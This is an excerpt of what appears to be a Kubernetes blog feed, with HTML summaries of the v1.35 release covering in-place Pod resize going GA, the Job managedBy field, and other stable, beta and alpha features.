      "summary": "<p>This release marks a major step: more than 6 years after its initial conception,\nthe <strong>In-Place Pod Resize</strong> feature (also known as In-Place Pod Vertical Scaling), first introduced as\nalpha in Kubernetes v1.27, and graduated to beta in Kubernetes v1.33, is now <strong>stable (GA)</strong> in Kubernetes\n1.35!</p>\n<p>This graduation is a major milestone for improving resource efficiency and flexibility for workloads\nrunning on Kubernetes.</p>\n<h2 id=\"what-is-in-place-pod-resize\">What is in-place Pod Resize?</h2>\n<p>In the past, the CPU and memory resources allocated to a container in a Pod were immutable. This meant changing\nthem required deleting and recreating the entire Pod. For stateful services, batch jobs, or latency-sensitive\nworkloads, this was an incredibly disruptive operation.</p>\n<p>In-Place Pod Resize makes CPU and memory requests and limits mutable, allowing you to adjust these resources\nwithin a running Pod, often without requiring a container restart.</p>\n<p><strong>Key Concept:</strong></p>\n<ul>\n<li><strong>Desired Resources:</strong> A container's <code>spec.containers[*].resources</code> field now represents the desired\nresources. For CPU and memory, these fields are now mutable.</li>\n<li><strong>Actual Resources:</strong> The <code>status.containerStatuses[*].resources</code> field reflects the resources currently\nconfigured for a running container.</li>\n<li><strong>Triggering a Resize:</strong> You can request a resize by updating the desired <code>requests</code>\nand <code>limits</code> in the Pod's specification by utilizing the new <code>resize</code> subresource.</li>\n</ul>\n<h2 id=\"how-can-i-start-using-in-place-pod-resize\">How can I start using in-place Pod Resize?</h2>\n<p>Detailed usage instructions and examples are provided in the official documentation:\n<a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/resize-container-resources/\">Resize CPU and Memory Resources assigned to Containers</a>.</p>\n<h2 id=\"how-does-this-help-me\">How does this help me?</h2>\n<p>In-place Pod Resize is a foundational building block that unlocks seamless, vertical autoscaling and\nimprovements to workload efficiency.</p>\n<ul>\n<li><strong>Resources adjusted without disruption</strong> Workloads sensitive to latency or restarts can have their resources\nmodified in-place without downtime or loss of state.</li>\n<li><strong>More powerful autoscaling</strong> Autoscalers are now empowered to adjust resources and with less\nimpact. For example, Vertical Pod Autoscaler (VPA)'s <code>InPlaceOrRecreate</code> update mode, which leverages this\nfeature, has graduated to beta. This allows resources to be adjusted automatically and seamlessly based on\nusage with minimal disruption.\n<ul>\n<li>See <a href=\"https://github.com/kubernetes/autoscaler/tree/master/vertical-pod-autoscaler/enhancements/4016-in-place-updates-support\">AEP-4016</a> for more details.</li>\n</ul>\n</li>\n<li><strong>Address transient resource needs</strong> Workloads that temporarily need more resources can be adjusted quickly. This enables features like the CPU Startup Boost (<a href=\"https://github.com/kubernetes/autoscaler/pull/7863\">AEP-7862</a>) where applications can request more CPU during startup and then automatically scale back down.</li>\n</ul>\n<p>Here are a few examples of some use cases:</p>\n<ul>\n<li>A game server that needs to adjust its size with shifting player count.</li>\n<li>A pre-warmed worker that can be shrunk while unused but inflated with the first request.</li>\n<li>Dynamically scale with load for efficient bin-packing.</li>\n<li>Increased resources for JIT compilation on startup.</li>\n</ul>\n<h2 id=\"changes-between-beta-1-33-and-stable-1-35\">Changes between beta (1.33) and stable (1.35)</h2>\n<p>Since the initial beta in v1.33, development effort has primarily been around stabilizing the feature and\nimproving its usability based on community feedback. Here are the primary changes for the stable release:</p>\n<ul>\n<li><strong>Memory limit decrease</strong> Decreasing memory limits was previously prohibited. This restriction has been\nlifted, and memory limit decreases are now permitted. The Kubelet attempts to prevent OOM-kills by allowing the\nresize only if the current memory usage is below the new desired limit. However, this check is best-effort and\nnot guaranteed.</li>\n<li><strong>Prioritized resizes</strong> If a node doesn't have enough room to accept all resize requests, <em>Deferred</em> resizes\nare reattempted based on the following priority:\n<ul>\n<li>PriorityClass</li>\n<li>QoS class</li>\n<li>Duration <em>Deferred</em>, with older requests prioritized first.</li>\n</ul>\n</li>\n<li><strong>Pod Level Resources (Alpha)</strong> Support for in-place Pod Resize with Pod Level Resources has been introduced\nbehind its own feature gate, which is alpha in v1.35.</li>\n<li><strong>Increased observability</strong>: There are now new Kubelet metrics and Pod events specifically associated with\nIn-Place Pod Resize to help users track and debug resource changes.</li>\n</ul>\n<h2 id=\"what-s-next\">What's next?</h2>\n<p>The graduation of In-Place Pod Resize to stable opens the door for powerful integrations across the Kubernetes\necosystem. There are several areas for futher improvement that are currently planned.</p>\n<h3 id=\"integration-with-autoscalers-and-other-projects\">Integration with autoscalers and other projects</h3>\n<p>There are planned integrations with several autoscalers and other projects to improve workload efficiency at a larger scale. Some projects under discussion:</p>\n<ul>\n<li>VPA CPU startup boost (<a href=\"https://github.com/kubernetes/autoscaler/tree/master/vertical-pod-autoscaler/enhancements/7862-cpu-startup-boost\">AEP-7862</a>): Allows applications to request more CPU at startup and scale back down after a specific period of time.</li>\n<li>VPA Support for in-place updates (<a href=\"https://github.com/kubernetes/autoscaler/tree/455d29039bf6b1eb9f784f498f28769a8698bc21/vertical-pod-autoscaler/enhancements/4016-in-place-updates-support\">AEP-4016</a>): VPA support for <code>InPlaceOrRecreate</code> has recently graduated to beta, with the eventual goal being to graduate\nthe feature to stable. Support for <code>InPlace</code> mode is still being worked on; see <a href=\"https://github.com/kubernetes/autoscaler/pull/8818\">this pull request</a>.</li>\n<li>Ray autoscaler: Plans to leverage In-Place Pod Resize to improve workload efficiency. See <a href=\"https://cloud.google.com/blog/products/containers-kubernetes/ray-on-gke-new-features-for-ai-scheduling-and-scaling\">this Google Cloud blog post</a> for more details.</li>\n<li>Agent-sandbox &quot;Soft-Pause&quot;: Investigating leveraging in-place Pod Resize for better improved latency. See the <a href=\"https://github.com/kubernetes-sigs/agent-sandbox/issues/103\">Github issue</a> for more details.</li>\n<li>Runtime support: Java and Python runtimes do not support resizing memory without restart. There is an open\nconversation with the Java developers, see <a href=\"https://bugs.openjdk.org/browse/JDK-8359211\">the bug</a>.</li>\n</ul>\n<p>If you have a project that could benefit from integration with in-place pod resize, please reach out using\nthe channels listed in the feedback section!</p>\n<h3 id=\"feature-expansion\">Feature expansion</h3>\n<p>Today, In-Place Pod Resize is prohibited when used in combination with: swap, the static CPU Manager, and the\nstatic Memory Manager. Additionally, resources other than CPU and memory are still immutable. Expanding the set\nof supported features and resources is under consideration as more feedback about community needs comes in.</p>\n<p>There are also plans to support workload preemption; if there is not enough room on the node for the resize of\na high priority pod, the goal is to enable policies to automatically evict a lower-priority pod or upsize\nthe node.</p>\n<h3 id=\"improved-stability\">Improved stability</h3>\n<ul>\n<li>\n<p><strong>Resolve kubelet-scheduler race conditions</strong> There are known race conditions between the kubelet and\nscheduler with regards to in-place pod resize. Work is underway to resolve these issues over the next few releases. See the <a href=\"https://github.com/kubernetes/kubernetes/issues/126891\">issue</a> for more details.</p>\n</li>\n<li>\n<p><strong>Safer memory limit decrease</strong> The Kubelet's best-effort check for OOM-kill prevention can be made even\nsafer by moving the memory usage check into the container runtime itself. See the <a href=\"https://github.com/kubernetes/kubernetes/issues/135670\">issue</a> for more details.</p>\n</li>\n</ul>\n<h2 id=\"providing-feedback\">Providing feedback</h2>\n<p>Looking to further build on this foundational feature, please share your feedback on how to improve and\nextend this feature. You can share your feedback through GitHub issues, mailing lists, or Slack channels\nrelated to the Kubernetes <a href=\"https://kubernetes.slack.com/archives/C0BP8PW9G\">#sig-node</a> and <a href=\"https://kubernetes.slack.com/archives/C09R1LV8S\">#sig-autoscaling</a> communities.</p>\n<p>Thank you to everyone who contributed to making this long-awaited feature a reality!</p>",

      "summary": "<p>In Kubernetes v1.35, the ability to specify an external Job controller (through <code>.spec.managedBy</code>) graduates to General Availability.</p>\n<p>This feature allows external controllers to take full responsibility for Job reconciliation, unlocking powerful scheduling patterns like multi-cluster dispatching with <a href=\"https://kueue.sigs.k8s.io/docs/concepts/multikueue/\">MultiKueue</a>.</p>\n<h2 id=\"why-delegate-job-reconciliation\">Why delegate Job reconciliation?</h2>\n<p>The primary motivation for this feature is to support multi-cluster batch scheduling architectures, such as MultiKueue.</p>\n<p>The MultiKueue architecture distinguishes between a Management Cluster and a pool of Worker Clusters:</p>\n<ul>\n<li>The Management Cluster is responsible for dispatching Jobs but not executing them. It needs to accept Job objects to track status, but it skips the creation and execution of Pods.</li>\n<li>The Worker Clusters receive the dispatched Jobs and execute the actual Pods.</li>\n<li>Users usually interact with the Management Cluster. Because the status is automatically propagated back, they can observe the Job's progress &quot;live&quot; without accessing the Worker Clusters.</li>\n<li>In the Worker Clusters, the dispatched Jobs run as regular Jobs managed by the built-in Job controller, with no <code>.spec.managedBy</code> set.</li>\n</ul>\n<p>By using <code>.spec.managedBy</code>, the MultiKueue controller on the Management Cluster can take over the reconciliation of a Job. It copies the status from the &quot;mirror&quot; Job running on the Worker Cluster back to the Management Cluster.</p>\n<p>Why not just disable the Job controller? While one could theoretically achieve this by disabling the built-in Job controller entirely, this is often impossible or impractical for two reasons:</p>\n<ol>\n<li>Managed Control Planes: In many cloud environments, the Kubernetes control plane is locked, and users cannot modify controller manager flags.</li>\n<li>Hybrid Cluster Role: Users often need a &quot;hybrid&quot; mode where the Management Cluster dispatches some heavy workloads to remote clusters but still executes smaller or control-plane-related Jobs in the Management Cluster. <code>.spec.managedBy</code> allows this granularity on a per-Job basis.</li>\n</ol>\n<h2 id=\"how-spec-managedby-works\">How <code>.spec.managedBy</code> works</h2>\n<p>The <code>.spec.managedBy</code> field indicates which controller is responsible for the Job, specifically there are two modes of operation:</p>\n<ul>\n<li><strong>Standard</strong>: if unset or set to the reserved value <code>kubernetes.io/job-controller</code>, the built-in Job controller reconciles the Job as usual (standard behavior).</li>\n<li><strong>Delegation</strong>: If set to any other value, the built-in Job controller skips reconciliation entirely for that Job.</li>\n</ul>\n<p>To prevent orphaned Pods or resource leaks, this field is immutable. You cannot transfer a running Job from one controller to another.</p>\n<p>If you are looking into implementing an external controller, be aware that your controller needs to be conformant with the definitions for the <a href=\"https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/job-v1/\">Job API</a>.\nIn order to enforce the conformance, a significant part of the effort was to introduce the extensive Job status validation rules.\nNavigate to the <a href=\"https://kubernetes.io/feed.xml#how-can-you-learn-more\">How can you learn more?</a> section for more details.</p>\n<h2 id=\"ecosystem-adoption\">Ecosystem Adoption</h2>\n<p>The <code>.spec.managedBy</code> field is rapidly becoming the standard interface for delegating control in the Kubernetes batch ecosystem.</p>\n<p>Various custom workload controllers are adding this field (or an equivalent) to allow MultiKueue to take over their reconciliation and orchestrate them across clusters:</p>\n<ul>\n<li><a href=\"https://github.com/kubernetes-sigs/jobset\">JobSet</a></li>\n<li><a href=\"https://www.kubeflow.org/docs/components/training/\">Kubeflow Trainer</a></li>\n<li><a href=\"https://docs.ray.io/en/latest/cluster/kubernetes/\">KubeRay</a></li>\n<li><a href=\"https://project-codeflare.github.io/appwrapper/\">AppWrapper</a></li>\n<li><a href=\"https://tekton.dev/docs/\">Tekton Pipelines</a></li>\n</ul>\n<p>While it is possible to use <code>.spec.managedBy</code> to implement a custom Job controller from scratch, we haven't observed that yet.

Crowell, Graziano Casto, Swathi Rao</p>\n<p>Similar to previous releases, the release of Kubernetes v1.35 introduces new stable, beta, and alpha features. The consistent delivery of high-quality releases underscores the strength of our development cycle and the vibrant support from our community.</p>\n<p>This release consists of 60 enhancements, including 17 stable, 19 beta, and 22 alpha features.</p>\n<p>There are also some <a href=\"https://kubernetes.io/feed.xml#deprecations-removals-and-community-updates\">deprecations and removals</a> in this release; make sure to read about those.</p>\n<h2 id=\"release-theme-and-logo\">Release theme and logo</h2>\n<figure class=\"release-logo \">\n<img alt=\"Kubernetes v1.35 Timbernetes logo: a storybook hex badge with a glowing world tree whose branches cradle Earth and a white Kubernetes wheel; three cheerful squirrels stand below—a wizard in a plum robe holding an LGTM scroll, a warrior with an axe and blue Kubernetes shield, and a lantern-carrying rogue in a navy cloak—on green grass above a gold ribbon reading World Tree Release, backed by soft mountains and cloud-swept sky\" src=\"https://kubernetes.io/blog/2025/12/17/kubernetes-v1-35-release/k8s-v1.35.png\" />\n</figure>\n<p>2025 began in the shimmer of Octarine: The Color of Magic (v1.33) and rode the gusts Of Wind &amp; Will (v1.34). We close the year with our hands on the World Tree, inspired by Yggdrasil, the tree of life that binds many realms. Like any great tree, Kubernetes grows ring by ring and release by release, shaped by the care of a global community.</p>\n<p>At its center sits the Kubernetes wheel wrapped around the Earth, grounded by the resilient maintainers, contributors and users who keep showing up. Between day jobs, life changes, and steady open-source stewardship, they prune old APIs, graft new features and keep one of the world’s largest open source projects healthy.</p>\n<p>Three squirrels guard the tree: a wizard holding the LGTM scroll for reviewers, a warrior with an axe and Kubernetes shield for the release crews who cut new branches, and a rogue with a lantern for the triagers who bring light to dark issue queues.</p>\n<p>Together, they stand in for a much larger adventuring party. Kubernetes v1.35 adds another growth ring to the World Tree, a fresh cut shaped by many hands, many paths and a community whose branches reach higher as its roots grow deeper.</p>\n<h2 id=\"spotlight-on-key-updates\">Spotlight on key updates</h2>\n<p>Kubernetes v1.35 is packed with new features and improvements. Here are a few select updates the Release Team would like to highlight!</p>\n<h3 id=\"stable-in-place-update-of-pod-resources\">Stable: In-place update of Pod resources</h3>\n<p>Kubernetes has graduated in-place updates for Pod resources to General Availability (GA).\nThis feature allows users to adjust CPU and memory resources without restarting Pods or Containers. Previously, such modifications required recreating Pods, which could disrupt workloads, particularly for stateful or batch applications. Earlier Kubernetes releases allowed you to change only infrastructure resource settings (requests and limits) for existing Pods. The new in-place functionality allows for smoother, nondisruptive vertical scaling, improves efficiency, and can also simplify development.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/1287\">KEP #1287</a> led by SIG Node.</p>\n<h3 id=\"beta-pod-certificates-for-workload-identity-and-security\">Beta: Pod certificates for workload identity and security</h3>\n<p>Previously, delivering certificates to pods required external controllers (cert-manager, SPIFFE/SPIRE), CRD orchestration, and Secret management, with rotation handled by sidecars or init containers. Kubernetes v1.35 enables native workload identity with automated certificate rotation, drastically simplifying service mesh and zero-trust architectures.</p>\n<p>Now, the <code>kubelet</code> generates keys, requests certificates via PodCertificateRequest, and writes credential bundles directly to the Pod's filesystem. The <code>kube-apiserver</code> enforces node restriction at admission time, eliminating the most common pitfall for third-party signers: accidentally violating node isolation boundaries. This enables pure mTLS flows with no bearer tokens in the issuance path.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4317\">KEP #4317</a> led by SIG Auth.</p>\n<h3 id=\"alpha-node-declared-features-before-scheduling\">Alpha: Node declared features before scheduling</h3>\n<p>When control planes enable new features but nodes lag behind (permitted by Kubernetes skew policy), the scheduler can place pods requiring those features onto incompatible older nodes.\nThe node-declaration features framework allows nodes to declare their supported Kubernetes features. With the new alpha feature enabled, a Node reports the features it supports, publishing this information to the control plane via a new <code>.status.declaredFeatures</code> field. Then, the <code>kube-scheduler</code>, admission controllers, and third-party components can use these declarations. For example, you can enforce scheduling and API validation constraints to ensure that Pods run only on compatible nodes.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5328\">KEP #5328</a> led by SIG Node.</p>\n<h2 id=\"features-graduating-to-stable\">Features graduating to Stable</h2>\n<p><em>This is a selection of some of the improvements that are now stable following the v1.35 release.</em></p>\n<h3 id=\"prefersamenode-traffic-distribution\">PreferSameNode traffic distribution</h3>\n<p>The <code>trafficDistribution</code> field for Services has been updated to provide more explicit control over traffic routing. A new option, <code>PreferSameNode</code>, has been introduced to let services strictly prioritize endpoints on the local node if available, falling back to remote endpoints otherwise.</p>\n<p>Simultaneously, the existing <code>PreferClose</code> option has been renamed to <code>PreferSameZone</code>. This change makes the API self-explanatory by explicitly indicating that traffic is preferred within the current availability zone. While <code>PreferClose</code> is preserved for backward compatibility, <code>PreferSameZone</code> is now the standard for zonal routing, ensuring that both node-level and zone-level preferences are clearly distinguished.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/3015\">KEP #3015</a> led by SIG Network.</p>\n<h3 id=\"job-api-managed-by-mechanism\">Job API managed-by mechanism</h3>\n<p>The Job API now includes a <code>managedBy</code> field that allows an external controller to handle Job status synchronization. This feature, which graduates to stable in Kubernetes v1.35, is primarily driven by <a href=\"https://github.com/kubernetes-sigs/kueue/tree/main/keps/693-multikueue\">MultiKueue</a>, a multi-cluster dispatching system where a Job created in a management cluster is mirrored and executed in a worker cluster, with status updates propagated back. To enable this workflow, the built-in Job controller must not act on a particular Job resource so that the Kueue controller can manage status updates instead.</p>\n<p>The goal is to allow clean delegation of Job synchronization to another controller. It does not aim to pass custom parameters to that controller or modify CronJob concurrency policies.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4368\">KEP #4368</a> led by SIG Apps.</p>\n<h3 id=\"reliable-pod-update-tracking-with-metadata-generation\">Reliable Pod update tracking with <code>.metadata.generation</code></h3>\n<p>Historically, the Pod API lacked the <code>metadata.generation</code> field found in other Kubernetes objects such as Deployments.\nBecause of this omission, controllers and users had no reliable way to verify whether the <code>kubelet</code> had actually processed the latest changes to a Pod's specification. This ambiguity was particularly problematic for features like <a href=\"https://kubernetes.io/feed.xml#stable-in-place-update-of-pod-resources\">In-Place Pod Vertical Scaling</a>, where it was difficult to know exactly when a resource resize request had been enacted.</p>\n<p>Kubernetes v1.33 added <code>.metadata.generation</code> fields for Pods, as an alpha feature. That field is now stable in the v1.35 Pod API, which means that every time a Pod's <code>spec</code> is updated, the <code>.metadata.generation</code> value is incremented. As part of this improvement, the Pod API also gained a <code>.status.observedGeneration</code> field, which reports the generation that the <code>kubelet</code> has successfully seen and processed. Pod conditions also each contain their own individual <code>observedGeneration</code> field that clients can report and / or observe.</p>\n<p>Because this feature has graduated to stable in v1.35, it is available for all workloads.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5067\">KEP #5067</a> led by SIG Node.</p>\n<h3 id=\"configurable-numa-node-limit-for-topology-manager\">Configurable NUMA node limit for topology manager</h3>\n<p>The <a href=\"https://kubernetes.io/docs/concepts/policy/node-resource-managers/\">topology manager</a> historically used a hard-coded limit of 8 for the maximum number of NUMA nodes it can support, preventing state explosion during affinity calculation. (There's an important detail here; a <em>NUMA node</em> is not the same as a Node in the Kubernetes API.) This limit on the number of NUMA nodes prevented Kubernetes from fully utilizing modern high-end servers, which increasingly feature CPU architectures with more than 8 NUMA nodes.</p>\n<p>Kubernetes v1.31 introduced a new, <strong>beta</strong> <code>max-allowable-numa-nodes</code> option to the topology manager policy configuration. In Kubernetes v1.35, that option is stable. Cluster administrators who enable it can use servers with more than 8 NUMA nodes.</p>\n<p>Although the configuration option is stable, the Kubernetes community is aware of the poor performance for large NUMA hosts, and there is a <a href=\"https://kep.k8s.io/5726\">proposed enhancement</a> (KEP-5726) that aims to improve on it. You can learn more about this by reading <a href=\"https://kubernetes.io/docs/tasks/administer-cluster/topology-manager/\">Control Topology Management Policies on a node</a>.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4622\">KEP #4622</a> led by SIG Node.</p>\n<h2 id=\"new-features-in-beta\">New features in Beta</h2>\n<p><em>This is a selection of some of the improvements that are now beta following the v1.35 release.</em></p>\n<h3 id=\"expose-node-topology-labels-via-downward-api\">Expose node topology labels via Downward API</h3>\n<p>Accessing node topology information, such as region and zone, from within a Pod has typically required querying the Kubernetes API server. While functional, this approach creates complexity and security risks by necessitating broad RBAC permissions or sidecar containers just to retrieve infrastructure metadata. Kubernetes v1.35 promotes the capability to expose node topology labels directly via the Downward API to beta.</p>\n<p>The <code>kubelet</code> can now inject standard topology labels, such as <code>topology.kubernetes.io/zone</code> and <code>topology.kubernetes.io/region</code>, into Pods as environment variables or projected volume files. The primary benefit is a safer and more efficient way for workloads to be topology-aware. This allows applications to natively adapt to their availability zone or region without dependencies on the API server, strengthening security by upholding the principle of least privilege and simplifying cluster configuration.</p>\n<p><strong>Note:</strong> Kubernetes now injects available topology labels to every Pod so that they can be used as inputs to the <a href=\"https://kubernetes.io/docs/concepts/workloads/pods/downward-api/\">downward API</a>. With the v1.35 upgrade, most cluster administrators will see several new labels added to each Pod; this is expected as part of the design.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4742\">KEP #4742</a> led by SIG Node.</p>\n<h3 id=\"native-support-for-storage-version-migration\">Native support for storage version migration</h3>\n<p>In Kubernetes v1.35, the native support for storage version migration graduates to beta and is enabled by default. This move integrates the migration logic directly into the core Kubernetes control plane (&quot;in-tree&quot;), eliminating the dependency on external tools.</p>\n<p>Historically, administrators relied on manual &quot;read/write loops&quot;—often piping <code>kubectl get</code> into <code>kubectl replace</code>—to update schemas or re-encrypt data at rest. This method was inefficient and prone to conflicts, especially for large resources like Secrets. With this release, the built-in controller automatically handles update conflicts and consistency tokens, providing a safe, streamlined, and reliable way to ensure stored data remains current with minimal operational overhead.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4192\">KEP #4192</a> led by SIG API Machinery.</p>\n<h3 id=\"mutable-volume-attach-limits\">Mutable Volume attach limits</h3>\n<p>A CSI (Container Storage Interface) driver is a Kubernetes plugin that provides a consistent way for storage systems to be exposed to containerized workloads. The <code>CSINode</code> object records details about all CSI drivers installed on a node. However, a mismatch can arise between the reported and actual attachment capacity on nodes. When volume slots are consumed after a CSI driver starts up, the <code>kube-scheduler</code> may assign stateful pods to nodes without sufficient capacity, ultimately getting stuck in a <code>ContainerCreating</code> state.</p>\n<p>Kubernetes v1.35 makes <code>CSINode.spec.drivers[*].allocatable.count</code> mutable so that a node’s available volume attachment capacity can be updated dynamically. It also allows CSI drivers to control how frequently the <code>allocatable.count</code> value is updated on all nodes by introducing a configurable refresh interval, defined through the <code>CSIDriver</code> object. Additionally, it automatically updates <code>CSINode.spec.drivers[*].allocatable.count</code> on detecting a failure in volume attachment due to insufficient capacity. Although this feature graduated to beta in v1.34 with the feature flag <code>MutableCSINodeAllocatableCount</code> disabled by default, it remains in beta for v1.35 to allow time for feedback, but the feature flag is enabled by default.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4876\">KEP #4876</a> led by SIG Storage.</p>\n<h3 id=\"opportunistic-batching\">Opportunistic batching</h3>\n<p>Historically, the Kubernetes scheduler processes pods sequentially with time complexity of <code>O(num pods × num nodes)</code>, which can result in redundant computation for compatible pods. This KEP introduces an opportunistic batching mechanism that aims to improve performance by identifying such compatible Pods via <code>Pod scheduling signature</code> and batching them together, allowing shared filtering and scoring results across them.</p>\n<p>The pod scheduling signature ensures that two pods with the same signature are “the same” from a scheduling perspective. It takes into account not only the pod and node attributes, but also the other pods in the system and global data about the pod placement. This means that any pod with the given signature will get the same scores/feasibility results from any arbitrary set of nodes.</p>\n<p>The batching mechanism consists of two operations that can be invoked whenever needed - <em>create</em> and <em>nominate</em>. Create leads to the creation of a new set of batch information from the scheduling results of Pods that have a valid signature. Nominate uses the batching information from create to set the nominated node name from a new Pod whose signature matches the canonical Pod’s signature.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5598\">KEP #5598</a> led by SIG Scheduling.</p>\n<h3 id=\"maxunavailable-for-statefulsets\"><code>maxUnavailable</code> for StatefulSets</h3>\n<p>A StatefulSet runs a group of Pods and maintains a sticky identity for each of those Pods. This is critical for stateful workloads requiring stable network identifiers or persistent storage. When a StatefulSet's <code>.spec.updateStrategy.&lt;type&gt;</code> is set to <code>RollingUpdate</code>, the StatefulSet controller will delete and recreate each Pod in the StatefulSet. It will proceed in the same order as Pod termination (from the largest ordinal to the smallest), updating each Pod one at a time.</p>\n<p>Kubernetes v1.24 added a new <strong>alpha</strong> field to a StatefulSet's <code>rollingUpdate</code> configuration settings, called <code>maxUnavailable</code>. That field wasn't part of the Kubernetes API unless your cluster administrator explicitly opted in.\nIn Kubernetes v1.35 that field is beta and is available by default. You can use it to define the maximum number of pods that can be unavailable during an update. This setting is most effective in combination with <code>.spec.podManagementPolicy</code> set to Parallel. You can set <code>maxUnavailable</code> as either a positive number (example: 2) or a percentage of the desired number of Pods (example: 10%). If this field is not specified, it will default to 1, to maintain the previous behavior of only updating one Pod at a time. This improvement allows stateful applications (that can tolerate more than one Pod being down) to finish updating faster.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/961\">KEP #961</a> led by SIG Apps.</p>\n<h3 id=\"configurable-credential-plugin-policy-in-kuberc\">Configurable credential plugin policy in <code>kuberc</code></h3>\n<p>The optional <a href=\"https://kubernetes.io/docs/reference/kubectl/kuberc/\"><code>kuberc</code> file</a> is a way to separate server configurations and cluster credentials from user preferences without disrupting already running CI pipelines with unexpected outputs.</p>\n<p>As part of the v1.35 release, <code>kuberc</code> gains additional functionality which allows users to configure credential plugin policy. This change introduces two fields <code>credentialPluginPolicy</code>, which allows or denies all plugins, and allows specifying a list of allowed plugins using <code>credentialPluginAllowlist</code>.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/3104\">KEP #3104</a> as a cooperation between SIG Auth and SIG CLI.</p>\n<h3 id=\"kyaml\">KYAML</h3>\n<p>YAML is a human-readable format of data serialization. In Kubernetes, YAML files are used to define and configure resources, such as Pods, Services, and Deployments. However, complex YAML is difficult to read. YAML's significant whitespace requires careful attention to indentation and nesting, while its optional string-quoting can lead to unexpected type coercion (see: The Norway Bug). While JSON is an alternative, it lacks support for comments and has strict requirements for trailing commas and quoted keys.</p>\n<p>KYAML is a safer and less ambiguous subset of YAML designed specifically for Kubernetes. Introduced as an opt-in alpha feature in v1.34, this feature graduated to beta in Kubernetes v1.35 and has been enabled by default. It can be disabled by setting the environment variable <code>KUBECTL_KYAML=false</code>.</p>\n<p>KYAML addresses challenges pertaining to both YAML and JSON. All KYAML files are also valid YAML files. This means you can write KYAML and pass it as an input to any version of kubectl. This also means that you don’t need to write in strict KYAML for the input to be parsed.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5295\">KEP #5295</a> led by SIG CLI.</p>\n<h3 id=\"configurable-tolerance-for-horizontalpodautoscalers\">Configurable tolerance for HorizontalPodAutoscalers</h3>\n<p>The Horizontal Pod Autoscaler (HPA) has historically relied on a fixed, global 10% tolerance for scaling actions. A drawback of this hardcoded value was that workloads requiring high sensitivity, such as those needing to scale on a 5% load increase, were often blocked from scaling, while others might oscillate unnecessarily.</p>\n<p>With Kubernetes v1.35, the configurable tolerance feature graduates to beta and is enabled by default. This enhancement allows users to define a custom tolerance window on a per-resource basis within the HPA <code>behavior</code> field. By setting a specific tolerance (e.g., lowering it to 0.05 for 5%), operators gain precise control over autoscaling sensitivity, ensuring that critical workloads react quickly to small metric changes, without requiring cluster-wide configuration adjustments.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4951\">KEP #4951</a> led by SIG Autoscaling.</p>\n<h3 id=\"support-for-user-namespaces-in-pods\">Support for user namespaces in Pods</h3>\n<p>Kubernetes is adding support for user namespaces, allowing pods to run with isolated user and group ID mappings instead of sharing host IDs. This means containers can operate as root internally while actually being mapped to an unprivileged user on the host, reducing the risk of privilege escalation in the event of a compromise. The feature improves pod-level security and makes it safer to run workloads that need root inside the container. Over time, support has expanded to both stateless and stateful Pods through id-mapped mounts.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/127\">KEP #127</a> led by SIG Node.</p>\n<h3 id=\"volumesource-oci-artifact-and-or-image\">VolumeSource: OCI artifact and/or image</h3>\n<p>When creating a Pod, you often need to provide data, binaries, or configuration files for your containers. This meant including the content into the main container image or using a custom init container to download and unpack files into an <code>emptyDir</code>. Both these approaches are still valid. Kubernetes v1.31 added support for the <code>image</code> volume type allowing Pods to declaratively pull and unpack OCI container image artifacts into a volume. This lets you package and deliver data-only artifacts such as configs, binaries, or machine learning models using standard OCI registry tools.</p>\n<p>With this feature, you can fully separate your data from your container image and remove the need for extra init containers or startup scripts. The image volume type has been in beta since v1.33 and is enabled by default in v1.35. Please note that using this feature requires a compatible container runtime, such as containerd v2.1 or later.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4639\">KEP #4639</a> led by SIG Node.</p>\n<h3 id=\"enforced-kubelet-credential-verification-for-cached-images\">Enforced <code>kubelet</code> credential verification for cached images</h3>\n<p>The <code>imagePullPolicy: IfNotPresent</code> setting currently allows a Pod to use a container image that is already cached on a node, even if the Pod itself does not possess the credentials to pull that image. A drawback of this behavior is that it creates a security vulnerability in multi-tenant clusters: if a Pod with valid credentials pulls a sensitive private image to a node, a subsequent unauthorized Pod on the same node can access that image simply by relying on the local cache.</p>\n<p>This KEP introduces a mechanism where the <code>kubelet</code> enforces credential verification for cached images. Before allowing a Pod to use a locally cached image, the <code>kubelet</code> checks if the Pod has the valid credentials to pull it. This ensures that only authorized workloads can use private images, regardless of whether they are already present on the node, significantly hardening the security posture for shared clusters.</p>\n<p>In Kubernetes v1.35, this feature has graduated to beta and is enabled by default. Users can still disable it by setting the <code>KubeletEnsureSecretPulledImages</code> feature gate to false. Additionally, the <code>imagePullCredentialsVerificationPolicy</code> flag allows operators to configure the desired security level, ranging from a mode that prioritizes backward compatibility to a strict enforcement mode that offers maximum security.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/2535\">KEP #2535</a> led by SIG Node.</p>\n<h3 id=\"fine-grained-container-restart-rules\">Fine-grained Container restart rules</h3>\n<p>Historically, the <code>restartPolicy</code> field was defined strictly at the Pod level, forcing the same behavior on all containers within a Pod. A drawback of this global setting was the lack of granularity for complex workloads, such as AI/ML training jobs. These often required <code>restartPolicy: Never</code> for the Pod to manage job completion, yet individual containers would benefit from in-place restarts for specific, retriable errors (like network glitches or GPU init failures).</p>\n<p>Kubernetes v1.35 addresses this by enabling <code>restartPolicy</code> and <code>restartPolicyRules</code> within the container API itself. This allows users to define restart strategies for individual regular and init containers that operate independently of the Pod's overall policy. For example, a container can now be configured to restart automatically only if it exits with a specific error code, avoiding the expensive overhead of rescheduling the entire Pod for a transient failure.</p>\n<p>In this release, the feature has graduated to beta and is enabled by default. Users can immediately leverage <code>restartPolicyRules</code> in their container specifications to optimize recovery 